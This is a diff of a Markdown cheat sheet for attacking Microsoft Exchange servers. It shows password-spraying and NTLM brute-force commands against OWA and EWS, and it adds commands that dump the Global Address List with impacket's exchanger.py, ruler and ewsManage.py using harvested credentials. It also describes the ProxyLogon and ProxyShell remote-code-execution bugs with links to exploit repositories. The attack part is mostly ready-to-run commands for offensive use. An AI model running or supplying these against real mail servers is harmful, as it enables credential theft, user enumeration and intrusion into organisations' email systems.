@@ -37,7 +37,7 @@ Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -
 Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
 ```
 
-#### python NTLM password Sparay
+### python NTLM password Sparay
 
 ```python
 python3 bruteforce/bruteforce.py -t https://mail.domain.com/EWS/Exchange.asmx -U users.txt -p TestPassword
@@ -48,8 +48,22 @@ python3 bruteforce/bruteforce.py -t https://mail.domain.com/EWS/Exchange.asmx -U
 ## GAL 
 The Microsoft Exchange Global Address List (GAL) is a list of all end users and their respective email addresses within an Exchange Server organization that uses Microsoft Outlook for email.
 
+### use exchanger.py [impacket](https://github.com/SecureAuthCorp/impacket)
+```python
+python exchanger.py DomainName/Username:"Password"@mail.domain.com nspi list-tables
+```
 
+### use ruler 
+```python
+./ruler-linux64 --url https://mail.domain.com/autodiscover/autodiscover.xml --email Username@domain.com -d DomainName -u Username -p Password --debug --verbose  abk dump --output gal.txt 
+```
 
+### use ewsManage.py
+```python
+python3 ewsManage.py mail.domain.com 443 plaintext DomainName Username Password findallpeopl
+```
+
+* for export GAL we should enum valid username,password and email first !
 
 
 
@@ -57,12 +71,10 @@ The Microsoft Exchange Global Address List (GAL) is a list of all end users and 
 
 ## [ProxyLogon](https://github.com/kh4sh3i/ProxyLogon)
 ProxyLogon is the formally generic name for CVE-2021-26855, a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the admin. We have also chained this bug with another post-auth arbitrary-file-write vulnerability, CVE-2021-27065, to get code execution.
-* [ProxyLogon](https://github.com/kh4sh3i/ProxyLogon)
 
 
 ## [ProxyShell](https://github.com/kh4sh3i/ProxyShell)
 CVE-2021-34473 Microsoft Exchange Server Remote Code Execution Vulnerability. This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL
-* [ProxyShell](https://github.com/kh4sh3i/ProxyShell)
 
 
 ## WebShell
